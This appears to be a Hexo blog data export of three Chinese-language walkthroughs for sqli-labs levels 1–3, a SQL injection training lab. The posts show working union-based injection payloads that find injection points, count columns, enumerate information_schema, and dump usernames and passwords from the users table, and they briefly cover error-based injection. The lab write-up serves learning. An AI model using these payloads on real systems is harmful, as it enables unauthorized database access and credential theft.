{"meta":{"title":"Hexo","subtitle":"","description":"","author":"FLYapple","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"sqli-labs_3","slug":"sqli-labs-3","date":"2022-03-23T10:41:21.000Z","updated":"2022-03-24T02:03:43.465Z","comments":true,"path":"2022/03/23/sqli-labs-3/","link":"","permalink":"http://example.com/2022/03/23/sqli-labs-3/","excerpt":"","text":"sqli-labs-t3注：在进行题解之前，建议前往sqli-labs第一关分析-百度经验 (baidu.com)学习前两关的绕过原理并尝试自行解题。 一、观察题目同t1，t2一样的提示，尝试提交id&#x3D;[num]，一切正常 二、寻找注入点尝试使用单引号，发现进行了报错 根据报错信息可知，这里有字符型注入点，并且在id&#x3D;1之后有一个括号。 尝试对括号进行绕过 提交 12id=1&#x27;) and 1=1 --+id=1&#x27;) and 1=2 --+ 同t1、t2，尝试输出数据库名称验证绕过成功 提交 1id=1&#x27;) and 1=2 union select 1,2,database() --+ 绕过成功 三、信息提取同t1，t2，在此不做过多赘述","categories":[],"tags":[]},{"title":"sqli-labs_2","slug":"sqli-labs-2","date":"2022-03-23T08:59:38.000Z","updated":"2022-03-24T02:00:09.710Z","comments":true,"path":"2022/03/23/sqli-labs-2/","link":"","permalink":"http://example.com/2022/03/23/sqli-labs-2/","excerpt":"","text":"sql-labs-t2注：同t1思路完全相同，仅注入点不同。可以不看此题解 一、观察题目同t1的提示，提交id&#x3D;1进行尝试 同t1思路，尝试寻找注入点 二、寻找注入点提交 1id=1&#x27; and 1=1 --+ 发现提示信息有and 1&#x3D;1 – ，因此尝试推测为整形注入点 进行尝试，提交 12id=1 and 1=1 --+id=1 and 1=2 --+ 发现存在注入点 三、查找表的结构同t1，先对表单属性个数进行测试 提交 1id=1 order by [num]--+ 同样到4时进行报错，推测有三个元素 对输出进行测试 提交 1id=-1 union select 1,2,3--+ 得出输出样式，同样是2，3位置可以输出。 获取数据库信息 提交 1id=-1 union select 1,group_concat(database()),3--+ 可知此数据库为security 之后在information_schema表中查找数据库表信息 提交 1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+ 找到数据库表名信息 根据表名查询表内属性 提交 1id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ 获得属性名称 对信息查询 提交 1id=-1 union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+","categories":[],"tags":[]},{"title":"sqli-labs_1","slug":"sqli-labs-1","date":"2022-03-22T11:40:06.000Z","updated":"2022-03-24T02:20:40.004Z","comments":true,"path":"2022/03/22/sqli-labs-1/","link":"","permalink":"http://example.com/2022/03/22/sqli-labs-1/","excerpt":"","text":"sqli-labs-t1union联合注入方法一、观察题目 提示写了“Please input the ID as parameter with numeric value”，因此尝试使用GET方法上传id数值，首先尝试id&#x3D;1，结果如下 之后尝试id&#x3D;2，3，4 二、尝试寻找注入点尝试使用id&#x3D;1 and 1&#x3D;1 # 和 id&#x3D;1 and 1&#x3D;2 # 判断是否有整形注入点 发现编译正常，无整型注入点 尝试使用id&#x3D;1’ and 1&#x3D;1 # 和 id&#x3D;1’ and 1&#x3D;2# 判断是否有字符型注入点 发现出现报错信息，根据报错可知为MySQL数据库，且存在字符型注入点。 注：–+和#均为注释符，可以进行末尾注释，但#在url中作为锚点（？） 不能当作数据进行传输，因此会出现报错，不能正常执行。可以使用url编码替换（%23） 注2：本题可以用单引号进行”注释“ 参考：SQL注入注释符(#、– 、&#x2F;**&#x2F;)使用条件及其他注释方式的探索 - impulse- - 博客园 三、查找表的结构信息首先测试该数据库的元素个数，使用order by [数字] 进行测试 提交 1id=1&#x27; order by [数字] 1，2，3都正常，当为4时报错，说明网页所调用表仅有3个属性 之后进行输出测试，查看网页输出对应属性 提交 1id=-1&#x27; union select 1,2,3 --+ 由此可以看出，此页面查询可返回三个结果，其中只显示属性2，3。大致推测是索引、用户名、密码。 知道如何输出有用信息后，查询数据库名 提交 1id=-1&#x27; union select 1,database(),3 --+ 可知数据库名为security 接下来利用information_schema表对所有结构进行查询。 注：关于information_schema表的主要内容参考MySQL 中的 information_schema 数据库_kikajack的博客-CSDN博客_information_schema 从schemata表中可查询所有数据库名称 提交 1id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+ 查询目标security数据库中table信息 首先查询表名 提交 1id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+ 需要寻找的用户信息应当在user表中，因此通过columns表对users表结构进行查询 提交 1id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+ 得知该表属性名称即可开始查询用户名和密码 提交 1id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+ 完成提取 报错注入xml报错关于extractvalue()和updatexml()的详细解释在学习基于extractvalue()和updatexml()的报错注入_A1ienX的博客-CSDN博客_updatexml中可以学习。 extractvalue(str1,str2)是查询xml元素的函数，其中str1是一个目标xml标签，str2是xml文档路径。当路径标签不合规范时会报错并显示其中内容。（对其中为什么能够执行sql语句暂不理解） updatexml(str1,str2,str3)是更新xml标签函数，str1和str2同上，str3为更新内容。报错方式同上。 具体查询步骤与union相同此处不再一一赘述。此处以extractvalue演示最终结果。 floor报错floor报错的相关知识可以在Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)进行学习 但未能实现例句。原因目前不明。","categories":[],"tags":[]}],"categories":[],"tags":[]}